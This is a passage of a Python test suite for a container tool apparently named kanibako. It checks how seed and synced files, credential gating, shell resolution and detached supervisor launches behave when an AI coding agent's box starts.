            f'self:\n  default:\n    seeded:\n      foo: ["{src}", "~/foo"]\n'
        )
        self._call(
            tmp_path,
            proj=self._proj(shell),
            agent_config_path=agent_cfg,
        )
        assert (shell / "foo" / "file.txt").read_text() == "hello"

    def test_target_default_seed_served(self, tmp_path):
        """A target's declared default seed copies even with no config files."""
        from types import SimpleNamespace
        shell = self._shell(tmp_path)
        src = tmp_path / "tsrc"
        src.mkdir()
        (src / "x.txt").write_text("data")
        target = SimpleNamespace(
            name="claude",
            default_seeds=lambda: {"agent.claude.seeded.x": (str(src), "~/x")},
        )
        self._call(tmp_path, proj=self._proj(shell), target=target)
        assert (shell / "x" / "x.txt").read_text() == "data"

    def test_box_suppresses_target_default_seed(self, tmp_path):
        """A box-level present-None (``null``) suppresses the target-declared
        default seed (the KeyStore merge suppression idiom, §3/§6e — present-None
        OMITs the inherited bind; the old terminal-``""`` idiom is retired).

        Director ruling (F8, 2026-07-02): the capability is spec-implied — a box
        may not set ``agent.<name>.*`` directly (an upward write, dropped at
        RESOLVE per spec §0 clause 4). ⮕ P7: the sanctioned route is now the §2h
        REQUEST ``pref.agent.<a>.seeded.x: null`` (the ``box.agent.*`` mirror it
        used to be is RETIRED, spec §2b). The pref installs present-None VERBATIM
        as an ordinary cascade level, so it OMITs the target seed AT MERGE (the §3
        type-split) — one route, no post-expand overlay, no collector raise.
        """
        from types import SimpleNamespace
        shell = self._shell(tmp_path)
        src = tmp_path / "ssrc"
        src.mkdir()
        (src / "x.txt").write_text("data")
        target = SimpleNamespace(
            name="claude",
            default_seeds=lambda: {"agent.claude.seeded.x": (str(src), "~/x")},
        )
        # The default seed ``agent.claude.seeded.x`` is DISCRIMINATED at source
        # ``agent.claude.seeded.x`` (the discriminated §2d shape); the box
        # suppresses it through its §2h REQUEST — the spec-legal box→agent tweak.
        ptoml = tmp_path / "settings.yaml"
        ptoml.write_text(
            "pref:\n  agent:\n    claude:\n      seeded:\n        x: null\n"
        )
        self._call(
            tmp_path, proj=self._proj(shell), target=target,
        )
        assert not (shell / "x").exists()

    def test_guest_home_dest_copies_contents_into_root(self, tmp_path):
        """guest_dest of ~/ (== /home/agent) copies src contents into shell root."""
        shell = self._shell(tmp_path)
        src = tmp_path / "hsrc"
        src.mkdir()
        (src / "root_file.txt").write_text("top")
        agent_cfg = tmp_path / "claude.yaml"
        agent_cfg.write_text(
            f'self:\n  default:\n    seeded:\n      home: ["{src}", "~/"]\n'
        )
        self._call(tmp_path, proj=self._proj(shell), agent_config_path=agent_cfg)
        assert (shell / "root_file.txt").read_text() == "top"

    def test_missing_host_src_skipped(self, tmp_path):
        """A seed whose host_src does not exist is skipped (no crash, no copy)."""
        shell = self._shell(tmp_path)
        missing = tmp_path / "does_not_exist"
        agent_cfg = tmp_path / "claude.yaml"
        agent_cfg.write_text(
            f'self:\n  default:\n    seeded:\n      gone: ["{missing}", "~/gone"]\n'
        )
        self._call(tmp_path, proj=self._proj(shell), agent_config_path=agent_cfg)
        assert not (shell / "gone").exists()
        assert list(shell.iterdir()) == []

    def test_seed_never_clobbers_existing_home_file(self, tmp_path):
        """A re-seed must NOT overwrite user-edited home content (the playbook
        clobber): existing dest files survive, absent ones are gap-filled.

        Reproduces the real bug where re-launching a box re-applied the
        ``seeded`` category over an owned ``~/playbook`` and wiped user edits.
        Seeds are now create-if-absent.
        """
        shell = self._shell(tmp_path)
        # Pre-existing, user-edited home content the box owns.
        home_pb = shell / "playbook"
        home_pb.mkdir()
        (home_pb / "devnotes.md").write_text("USER EDIT")

        # The seed source ships the SAME relative path (different content) plus
        # a file the home does not yet have.
        src = tmp_path / "src"
        (src / "playbook").mkdir(parents=True)
        (src / "playbook" / "devnotes.md").write_text("TEMPLATE")
        (src / "playbook" / "STARTUP.md").write_text("NEW")

        agent_cfg = tmp_path / "claude.yaml"
        agent_cfg.write_text(
            f'self:\n  default:\n    seeded:\n      pb: ["{src}", "~/"]\n'
        )
        self._call(tmp_path, proj=self._proj(shell), agent_config_path=agent_cfg)

        # (a) the pre-existing edited file is NOT clobbered.
        assert (home_pb / "devnotes.md").read_text() == "USER EDIT"
        # (b) the absent file is gap-filled.
        assert (home_pb / "STARTUP.md").read_text() == "NEW"

    def test_single_file_seed_does_not_clobber_existing_dest(self, tmp_path):
        """A single-FILE seed whose dest already exists is left unchanged."""
        shell = self._shell(tmp_path)
        # Pre-existing dest file the box owns.
        (shell / "note.md").write_text("USER EDIT")

        src = tmp_path / "note_src.md"
        src.write_text("TEMPLATE")
        agent_cfg = tmp_path / "claude.yaml"
        agent_cfg.write_text(
            f'self:\n  default:\n    seeded:\n      note: ["{src}", "~/note.md"]\n'
        )
        self._call(tmp_path, proj=self._proj(shell), agent_config_path=agent_cfg)

        assert (shell / "note.md").read_text() == "USER EDIT"

    def test_non_credential_seed_copied_even_when_not_sharing(self, tmp_path):
        """deliver_creds=False (private box) suppresses only credential-flagged seeds; a
        plain config seed (is_credential False) still copies (D-M4 gate is
        scoped)."""
        shell = self._shell(tmp_path)
        src = tmp_path / "src"
        src.mkdir()
        (src / "file.txt").write_text("hello")
        agent_cfg = tmp_path / "claude.yaml"
        agent_cfg.write_text(
            f'self:\n  default:\n    seeded:\n      foo: ["{src}", "~/foo"]\n'
        )
        self._call(
            tmp_path, proj=self._proj(shell), agent_config_path=agent_cfg,
            deliver_creds=False,
        )
        assert (shell / "foo" / "file.txt").read_text() == "hello"

    def test_workspace_dest_lands_under_project_not_shell(self, tmp_path):
        """Unification (P3): a ~/workspace/... SEED dest maps under project_path.

        The former nested ``_host_dest`` shared the same latent ``/workspace`` gap
        as the synced translator (it mapped everything under home to shell_path).
        Routing seeds through ``_guest_dest_to_host`` applies the canonical
        workspace split uniformly. No shipped seed targets ~/workspace (default
        seeds = {}, the template trio -> ~), so this is a latent-only correctness
        gain — but the seed path now agrees with the mount/synced paths.
        """
        shell = self._shell(tmp_path)
        project = tmp_path / "project"
        project.mkdir()
        proj = self._proj(shell)
        proj.project_path = project  # distinct from shell_path
        src = tmp_path / "wssrc"
        src.mkdir()
        (src / "f.txt").write_text("seed-ws")
        agent_cfg = tmp_path / "claude.yaml"
        agent_cfg.write_text(
            f'self:\n  default:\n    seeded:\n'
            f'      ws: ["{src}", "~/workspace/sub"]\n'
        )
        self._call(tmp_path, proj=proj, agent_config_path=agent_cfg)
        assert (project / "sub" / "f.txt").read_text() == "seed-ws"
        assert not (shell / "workspace" / "sub").exists()


class TestApplySyncedCopies:
    """Unit tests for _apply_synced_copies (the `<scope>.synced.<name>` cat)."""

    def _std(self, tmp_path):
        from types import SimpleNamespace
        return SimpleNamespace(
            agents=tmp_path / "agents",
            data_home=tmp_path / "data_home",
            data_path=tmp_path / "data",
            data=tmp_path / "data",
            channels=tmp_path / "channels",
            template=tmp_path / "template",
            canon=tmp_path / "canon",
            registry=tmp_path / "registry.yaml",
            primary_workset=tmp_path / "primary_workset",
            settings=tmp_path / "settings.yaml",
            # B2: the channel partition roots box_channel_addresses reads (the
            # meta.box.{inbox,share_global} identity anchors).
            channels_mailboxes=tmp_path / "channels" / "mailboxes",
            channels_share=tmp_path / "channels" / "share",
            # B2b: the system channel type-roots folded into resolved_sys so the
            # @system.channels.* ALL-PROJECTS channel binds resolve from the snapshot.
            channels_common=tmp_path / "channels" / "common",
            channels_chat=tmp_path / "channels" / "chat",
            # B2b: the PRIMARY logs dir helper_log_path reads (= the resolved
            # workset.logs anchor the helper-log bind routes through).
            primary_logs=tmp_path / "primary_workset" / "logs",
        )

    def _proj(self, shell_path, group=None):
        from types import SimpleNamespace
        # B1: meta.runtime.* needs a real mode. group=None here = default/PRIMARY
        # (the @config.primary_workset @-ref, so project_path is unused).
        # B2: meta.box.* identity anchors need the box name (proj.name).
        # B2b: the workset path anchors are derived off the vault paths + the box
        # home's box-parent, so the proj fake supplies them.
        return SimpleNamespace(
            shell_path=shell_path, group=group, name="seedbox",
            mode=BoxMode.primary, project_path=shell_path,
            # P6c: the cascade box/workset tier files are single-sourced off
            # proj.metadata_path (box_workset_settings_paths).
            metadata_path=shell_path.parent,
            vault_ro_path=shell_path.parent / "vault" / "ro" / "seedbox",
            vault_rw_path=shell_path.parent / "vault" / "rw" / "seedbox",
        )

    def _logger(self):
        import logging
        return logging.getLogger("test_apply_synced_copies")

    def _shell(self, tmp_path):
        shell = tmp_path / "shell"
        shell.mkdir()
        return shell

    def _call(self, tmp_path, *, std=None, proj=None, target=None,
              global_config_path=None, agent_config_path=None,
              deliver_creds=True):
        from kanibako.commands.start import _apply_synced_copies
        # P6c: the box-tier synced config is single-sourced off proj.metadata_path/
        # settings.yaml (box_workset_settings_paths); tests place it there directly.
        _apply_synced_copies(
            std=std or self._std(tmp_path),
            proj=proj,
            agent_name="claude",
            target=target,
            global_config_path=global_config_path,
            agent_config_path=agent_config_path,
            logger=self._logger(),
            deliver_creds=deliver_creds,
        )

    def test_empty_no_config_copies_nothing(self, tmp_path):
        """No synced config → nothing copied (additive no-op)."""
        shell = self._shell(tmp_path)
        self._call(tmp_path, proj=self._proj(shell))
        assert list(shell.iterdir()) == []

    def test_configured_synced_copied(self, tmp_path):
        """A box-config synced entry copies host_src into shell_path/<dest>."""
        shell = self._shell(tmp_path)
        src = tmp_path / "creds.txt"
        src.write_text("token")
        ptoml = tmp_path / "settings.yaml"
        ptoml.write_text(f'box:\n  synced:\n    cred: ["{src}", "~/cred.txt"]\n')
        self._call(tmp_path, proj=self._proj(shell))
        assert (shell / "cred.txt").read_text() == "token"

    def test_synced_suppressed_when_not_sharing(self, tmp_path):
        """deliver_creds=False (private box) suppresses every synced entry (D-M4)."""
        shell = self._shell(tmp_path)
        src = tmp_path / "creds.txt"
        src.write_text("token")
        ptoml = tmp_path / "settings.yaml"
        ptoml.write_text(f'box:\n  synced:\n    cred: ["{src}", "~/cred.txt"]\n')
        self._call(
            tmp_path, proj=self._proj(shell),
            deliver_creds=False,
        )
        assert not (shell / "cred.txt").exists()

    def test_mtime_gate_skips_fresh_dest(self, tmp_path):
        """An unchanged source (dest newer-or-equal) is not recopied."""
        import os
        shell = self._shell(tmp_path)
        src = tmp_path / "creds.txt"
        src.write_text("old")
        ptoml = tmp_path / "settings.yaml"
        ptoml.write_text(f'box:\n  synced:\n    cred: ["{src}", "~/cred.txt"]\n')
        dest = shell / "cred.txt"
        dest.write_text("newer")
        # Make dest strictly newer than src.
        os.utime(src, (1000, 1000))
        os.utime(dest, (2000, 2000))
        self._call(tmp_path, proj=self._proj(shell))
        # mtime gate: dest is newer, so it is NOT overwritten.
        assert dest.read_text() == "newer"

    def test_missing_host_src_skipped(self, tmp_path):
        """A synced whose host_src does not exist is skipped (no crash)."""
        shell = self._shell(tmp_path)
        missing = tmp_path / "nope"
        ptoml = tmp_path / "settings.yaml"
        ptoml.write_text(f'box:\n  synced:\n    gone: ["{missing}", "~/gone"]\n')
        self._call(tmp_path, proj=self._proj(shell))
        assert list(shell.iterdir()) == []

    def test_workspace_dest_lands_under_project_not_shell(self, tmp_path):
        """P3 bug-fix: a ~/workspace/... synced dest maps under proj.project_path
        (the workspace bind), NOT the shadowed shell_path/workspace stub.

        Regression guard: the FORMER inline synced translator lacked the
        ``/workspace`` split, so this entry computed shell_path/workspace/sub/f.txt
        (invisible in the box behind the workspace bind). Routing through the
        shared ``_guest_dest_to_host`` fixes it. This test FAILS on the old code.
        """
        shell = self._shell(tmp_path)
        project = tmp_path / "project"
        project.mkdir()
        proj = self._proj(shell)
        proj.project_path = project  # distinct from shell_path
        src = tmp_path / "ws.txt"
        src.write_text("in-workspace")
        ptoml = tmp_path / "settings.yaml"
        ptoml.write_text(
            f'box:\n  synced:\n    ws: ["{src}", "~/workspace/sub/f.txt"]\n'
        )
        self._call(tmp_path, proj=proj)
        # Correct: lands under project_path.
        assert (project / "sub" / "f.txt").read_text() == "in-workspace"
        # The old (buggy) shadowed path was NOT written.
        assert not (shell / "workspace" / "sub" / "f.txt").exists()


class TestBoxShellLaunch:
    """Verify the no-agent launch shell comes from resolve_box_shell (Phase 3).

    The no-agent case is when ``target.default_entrypoint`` is None (NoAgentTarget):
    ``_run_container`` then resolves the shell via ``resolve_box_shell`` instead of
    a hardcoded ``/bin/bash``.  A real agent (non-None default_entrypoint) keeps
    using its own entrypoint.
    """

    def test_no_agent_persistent_uses_resolved_shell(self, start_mocks):
        """No-agent persistent launch wraps the resolved shell, not /bin/bash."""
        with start_mocks() as m:
            m.target.default_entrypoint = None  # NoAgentTarget
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/bash", "image"),
            ) as m_resolve:
                _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                    persistent=True,
                )
            m_resolve.assert_called_once()
            call = m.runtime.run.call_args
            # Persistent tmux wrap: entrypoint=tmux, resolved shell is the
            # inner_cmd after the "--" separator in cli_args.
            assert call.kwargs.get("entrypoint") == "tmux"
            cli_args = call.kwargs.get("cli_args") or []
            assert "--" in cli_args
            assert cli_args[cli_args.index("--") + 1] == "/bin/bash"

    def test_no_agent_persistent_uses_resolved_zsh(self, start_mocks):
        """box.shell=/bin/zsh (resolver result) is the launched inner command."""
        with start_mocks() as m:
            m.target.default_entrypoint = None
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/zsh", "box.shell"),
            ):
                _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                    persistent=True,
                )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert cli_args[cli_args.index("--") + 1] == "/bin/zsh"

    def test_no_agent_nonpersistent_uses_resolved_shell_as_entrypoint(self, start_mocks):
        """No-agent ephemeral launch passes the resolved shell as entrypoint."""
        with start_mocks() as m:
            m.target.default_entrypoint = None
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/zsh", "box.shell"),
            ):
                _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                    persistent=False,
                )
            assert m.runtime.run.call_args.kwargs.get("entrypoint") == "/bin/zsh"

    def test_no_agent_passes_runtime_and_image_to_resolver(self, start_mocks):
        """The resolver is given runtime+image so lazy image-shell backfill works."""
        with start_mocks() as m:
            m.target.default_entrypoint = None
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("sh", "sh"),
            ) as m_resolve:
                _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                    persistent=False,
                )
            kwargs = m_resolve.call_args.kwargs
            assert kwargs.get("runtime") is m.runtime
            assert kwargs.get("image") == "test:latest"

    def test_real_agent_persistent_supervises_agent_with_shell_fallback(self, start_mocks):
        """E2c: a real agent under persistent is SUPERVISED — the agent binary is the
        supervised payload; box.shell IS resolved, but only as the supervisor's
        forward-compat FALLBACK keep-alive (never the agent's own entrypoint)."""
        import shlex

        with start_mocks() as m:
            # Default fixture target has default_entrypoint == "claude".
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/zsh", "box.shell"),
            ) as m_resolve:
                _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                    persistent=True,
                )
            # box.shell is now resolved for the supervisor's fallback keep-alive.
            m_resolve.assert_called_once()
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert cli_args[0] == "-c"
            script = cli_args[1]
            # The agent binary rides the supervisor's `-- <agent>` payload — now
            # nested in the directive flatten shim (default for all agents), so the
            # `--` payload is `sh -c '<flatten>; exec "$@"' sh claude`.
            sup = script.split("&& exec ", 1)[1].split(" || exec ", 1)[0]
            sup_argv = shlex.split(sup)
            after_sep = sup_argv[sup_argv.index("--"):]
            assert "claude" in after_sep
            assert any("import-directives.py" in a for a in after_sep)
            # ...and /bin/zsh is ONLY the `|| exec` fallback keep-alive, not the agent.
            fb = script.split(" || exec ", 1)[1]
            assert "/bin/zsh" in fb

    def test_real_agent_nonpersistent_uses_agent_entrypoint(self, start_mocks):
        """A real agent ephemeral launch passes the agent entrypoint, not box.shell."""
        with start_mocks() as m:
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/zsh", "box.shell"),
            ) as m_resolve:
                _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                    persistent=False,
                )
            m_resolve.assert_not_called()
            # Real agent uses the AGENT entrypoint, never box.shell — now nested in
            # the directive flatten shim (default for all agents).
            kw = m.runtime.run.call_args.kwargs
            full = " ".join(
                [str(kw.get("entrypoint") or "")]
                + [str(a) for a in (kw.get("cli_args") or [])]
            )
            assert "claude" in full
            assert "/bin/zsh" not in full
            assert "import-directives.py" in full


class TestDetachKeepAlive:
    """Phase 4 + E2b: `--detach` starts a background KEEP-ALIVE box.

    E2b makes PID-1 on a detached AGENT box the always-on SUPERVISOR
    (``kanibako.box_supervisor``), which runs the agent in a detached tmux
    session and self-heals it — an import-GATED ``sh -c`` that degrades to the
    bare-shell keep-alive on an old image.  The caller's terminal is NOT attached
    (no ``runtime.exec``), and the box stays Up independent of the agent.
    """

    def test_detach_pid1_supervises_agent(self, start_mocks):
        """E2b: detach makes PID-1 the SUPERVISOR running the AGENT (import-gated),
        with the resolved SHELL as the forward-compat fallback keep-alive."""
        with start_mocks() as m:
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/bash", "image"),
            ) as m_resolve:
                rc = _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                    persistent=True,
                    detach=True,
                )
            assert rc == 0
            # box.shell was resolved — it is the forward-compat fallback keep-alive.
            m_resolve.assert_called_once()
            call = m.runtime.run.call_args
            # Detached at the podman layer.
            assert call.kwargs.get("detach") is True
            # PID-1 = an import-gated `sh -c`: supervisor(agent) || fallback(shell).
            assert call.kwargs.get("entrypoint") == "sh"
            cli_args = call.kwargs.get("cli_args") or []
            assert cli_args[0] == "-c"
            script = cli_args[1]
            # The supervisor runs the AGENT as PID-1...
            assert 'exec env "PYTHONPATH=/opt/kanibako${PYTHONPATH:+:$PYTHONPATH}" python3 -m kanibako.box_supervisor' in script
            assert "claude" in script
            # ...and the resolved shell is the `|| exec` degrade path.
            assert "/bin/bash" in script

    def test_detach_does_not_attach_terminal(self, start_mocks):
        """Detach returns WITHOUT an interactive attach (no ``runtime.exec``)."""
        with start_mocks() as m:
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/bash", "image"),
            ):
                rc = _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                    persistent=True,
                    detach=True,
                )
            assert rc == 0
            m.runtime.run.assert_called_once()
            # The default attaching path exec's `tmux attach`; detach must not.
            m.runtime.exec.assert_not_called()

    def test_detach_keeps_box_up_no_teardown(self, start_mocks):
        """Detach never tears the box down (it must stay Up for later use)."""
        with start_mocks() as m:
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/bash", "image"),
            ):
                _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                    persistent=True,
                    detach=True,
                )
            # is_running stays True after run() (fixture side effect); a running
            # container is never rm'd by the teardown path.
            m.runtime.rm.assert_not_called()

    def test_detach_on_running_box_reports_and_returns(self, start_mocks):
        """`start --detach` on an already-running box: report + return 0, no attach."""
        with start_mocks() as m:
            m.runtime.is_running.return_value = True
            # Neutralize the run()-side-effect so is_running stays True throughout.
            m.runtime.run.side_effect = None
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
                persistent=True,
                detach=True,
            )
            assert rc == 0
            m.runtime.run.assert_not_called()
            m.runtime.exec.assert_not_called()

    def test_default_persistent_attaches_mutation_anchor(self, start_mocks):
        """MUTATION ANCHOR (E2c): the DEFAULT persistent path (detach=False) SUPERVISES
        the agent with the FOREGROUND `teardown` policy and ATTACHES (``runtime.exec``)
        — distinguishing it from the detached path's `self-heal` policy."""
        with start_mocks() as m:
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
                persistent=True,
                detach=False,
            )
            assert rc == 0
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert cli_args[0] == "-c"
            script = cli_args[1]
            # Supervised as PID-1 with the FOREGROUND teardown policy...
            assert 'exec env "PYTHONPATH=/opt/kanibako${PYTHONPATH:+:$PYTHONPATH}" python3 -m kanibako.box_supervisor' in script
            assert "--on-agent-exit teardown" in script
            assert "claude" in script
            # ...and the terminal IS attached.
            m.runtime.exec.assert_called_once()

    def test_foreground_supervised_crash_surfaces_container_exit_code(self, start_mocks):
        """E2d: a SUPERVISED foreground box that EXITED non-zero (the agent crashed
        and the teardown-policy supervisor propagated its code, stopping the
        container) surfaces a NON-ZERO kanibako rc — the tmux-attach exec's own (0)
        status is NOT the truth, so the post-attach path adopts the container's real
        exit code."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._container_exit_code", return_value=42,
        ):
            # After the interactive attach returns, the container has EXITED.
            def _exec_then_exit(*_a, **_k):
                m.runtime.is_running.return_value = False
                return 0

            m.runtime.exec.side_effect = _exec_then_exit
            rc = _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True, detach=False,
            )
            assert rc == 42

    def test_foreground_supervised_clean_exit_keeps_zero(self, start_mocks):
        """E2d control: a CLEAN container exit (code 0) keeps rc 0 — the non-zero-only
        ``or rc`` adoption never fabricates a failure from a clean supervised exit."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._container_exit_code", return_value=0,
        ):
            def _exec_then_exit(*_a, **_k):
                m.runtime.is_running.return_value = False
                return 0

            m.runtime.exec.side_effect = _exec_then_exit
            rc = _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True, detach=False,
            )
            assert rc == 0

    def test_foreground_tty_suppresses_raw_logs_but_still_feeds_setup_gate(
        self, start_mocks, capsys
    ):
        """FF-10 (b): on an INTERACTIVE tty foreground exit the raw captured pane is
        NOT echoed at the human, yet ``logs`` is still read by the setup gate — the
        diagnostics drive stays wired.  Terminal restore (a) fires on the same path.
        (The launch-time crash-and-retry net was removed; the setup gate is now the
        sole ``logs`` consumer on this path.)"""
        with start_mocks() as m, patch(
            "kanibako.commands.start._interactive_host", return_value=True,
        ), patch(
            "kanibako.commands.start._restore_host_terminal",
        ) as m_restore, patch(
            "kanibako.commands.start._container_logs",
            return_value="agent exited cleanly",
        ):
            m.target.should_run_setup.return_value = False

            def _exec_then_exit(*_a, **_k):
                m.runtime.is_running.return_value = False
                return 0

            m.runtime.exec.side_effect = _exec_then_exit
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True, detach=False,
            )
            # (b) the setup gate STILL receives the (unchanged) logs...
            m.target.should_run_setup.assert_called_once_with(
                "agent exited cleanly"
            )
            # ...but the raw pane was NOT echoed at the human's tty.
            assert "agent exited cleanly" not in capsys.readouterr().err
            # (a) the host terminal was restored on the tty path.
            m_restore.assert_called_once()

    def test_foreground_tty_setup_gate_fires_and_suppresses_logs(
        self, start_mocks, capsys
    ):
        """FF-10 (b): on the interactive tty exit path the launch-validation gate
        ``should_run_setup`` still receives the (unchanged) logs and errors (rc==1),
        while the raw captured pane is NOT echoed at the human — proving the tty
        suppression drops ONLY the raw echo, not the diagnostics logs drive."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._interactive_host", return_value=True,
        ), patch(
            "kanibako.commands.start._restore_host_terminal",
        ), patch(
            "kanibako.commands.start._container_logs",
            return_value="Please run setup",
        ), patch(
            "kanibako.commands.start.writeback_session_credentials",
        ), patch(
            "kanibako.commands.start._print_setup_did_not_take",
        ) as m_setup_msg:
            m.target.should_run_setup.return_value = True

            def _exec_then_exit(*_a, **_k):
                m.runtime.is_running.return_value = False
                return 0

            m.runtime.exec.side_effect = _exec_then_exit
            rc = _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True, detach=False,
            )
            # the setup gate received the unchanged logs and errored...
            m.target.should_run_setup.assert_called_once_with("Please run setup")
            assert rc == 1
            m_setup_msg.assert_called_once()
            # ...but the raw pane was NOT echoed at the human's tty.
            assert "Please run setup" not in capsys.readouterr().err

    def test_foreground_non_tty_prints_raw_logs_unchanged(self, start_mocks, capsys):
        """FF-10 (b) control: with NO tty (piped output / ``podman logs`` / CI) the raw
        captured pane is still echoed byte-for-byte — downstream tooling depends on it."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._interactive_host", return_value=False,
        ), patch(
            "kanibako.commands.start._container_logs",
            return_value="raw pane dump line",
        ):
            m.target.should_run_setup.return_value = False

            def _exec_then_exit(*_a, **_k):
                m.runtime.is_running.return_value = False
                return 0

            m.runtime.exec.side_effect = _exec_then_exit
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True, detach=False,
            )
            assert "raw pane dump line" in capsys.readouterr().err

    def test_foreground_tty_crash_still_prints_logs(self, start_mocks, capsys):
        """FF-10 crash contract (restores 05f7f04): on an INTERACTIVE tty the raw
        captured pane suppression applies ONLY to a CLEAN exit.  When the foreground
        box exits with a NON-ZERO container code, ``_restore_host_terminal`` has just
        torn down the alt-screen the human watched live, so the captured dead-agent
        pane — the death cause — MUST still be echoed at the tty."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._interactive_host", return_value=True,
        ), patch(
            "kanibako.commands.start._restore_host_terminal",
        ), patch(
            "kanibako.commands.start._container_exit_code", return_value=1,
        ), patch(
            "kanibako.commands.start._container_logs",
            return_value="DEAD_AGENT_MARKER: crashed",
        ):
            m.target.should_run_setup.return_value = False

            def _exec_then_exit(*_a, **_k):
                m.runtime.is_running.return_value = False
                return 0

            m.runtime.exec.side_effect = _exec_then_exit
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True, detach=False,
            )
            # The crash (rc != 0) surfaces the captured pane even at the tty.
            assert "DEAD_AGENT_MARKER: crashed" in capsys.readouterr().err

    def test_detach_implies_persistent_from_nonpersistent_arg(self, start_mocks):
        """detach=True forces the persistent/detached launch even if a caller
        passes persistent=False (defensive guard)."""
        with start_mocks() as m:
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/bash", "image"),
            ):
                rc = _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                    persistent=False,
                    detach=True,
                )
            assert rc == 0
            assert m.runtime.run.call_args.kwargs.get("detach") is True
            m.runtime.exec.assert_not_called()


class TestHostTerminalHygiene:
    """FF-10 (a): the host-tty restore + interactive-detection helpers."""

    def test_restore_emits_sequence_on_tty(self):
        from kanibako.commands.start import _restore_host_terminal
        stream = MagicMock()
        stream.isatty.return_value = True
        with patch("kanibako.commands.start.sys.stderr", stream):
            _restore_host_terminal()
        stream.write.assert_called_once_with("\033[?1049l\033[0m\033[?25h")
        stream.flush.assert_called_once()

    def test_restore_noop_on_non_tty(self):
        from kanibako.commands.start import _restore_host_terminal
        err = MagicMock()
        err.isatty.return_value = False
        out = MagicMock()
        out.isatty.return_value = False
        with patch("kanibako.commands.start.sys.stderr", err), \
             patch("kanibako.commands.start.sys.stdout", out):
            _restore_host_terminal()
        err.write.assert_not_called()
        out.write.assert_not_called()

    def test_restore_tolerates_write_error(self):
        from kanibako.commands.start import _restore_host_terminal
        err = MagicMock()
        err.isatty.return_value = True
        err.write.side_effect = ValueError("closed")
        out = MagicMock()
        out.isatty.return_value = False
        with patch("kanibako.commands.start.sys.stderr", err), \
             patch("kanibako.commands.start.sys.stdout", out):
            _restore_host_terminal()  # must not raise

    def test_interactive_host_true_when_stderr_tty(self):
        from kanibako.commands.start import _interactive_host
        err = MagicMock()
        err.isatty.return_value = True
        with patch("kanibako.commands.start.sys.stderr", err):
            assert _interactive_host() is True

    def test_interactive_host_false_when_no_tty(self):
        from kanibako.commands.start import _interactive_host
        err = MagicMock()
        err.isatty.return_value = False
        out = MagicMock()
        out.isatty.return_value = False
        with patch("kanibako.commands.start.sys.stderr", err), \
             patch("kanibako.commands.start.sys.stdout", out):
            assert _interactive_host() is False

    def test_interactive_host_tolerates_isatty_raise(self):
        from kanibako.commands.start import _interactive_host
        err = MagicMock()
        err.isatty.side_effect = ValueError("detached")
        out = MagicMock()
        out.isatty.return_value = False
        with patch("kanibako.commands.start.sys.stderr", err), \
             patch("kanibako.commands.start.sys.stdout", out):
            assert _interactive_host() is False


class TestStartDetachedHelper:
    """The public ``start_detached`` entry (reused by `kanibako code`)."""

    def test_start_detached_routes_to_detached_launch(self, start_mocks):
        from kanibako.commands.start import start_detached
        with start_mocks() as m:
            with patch(
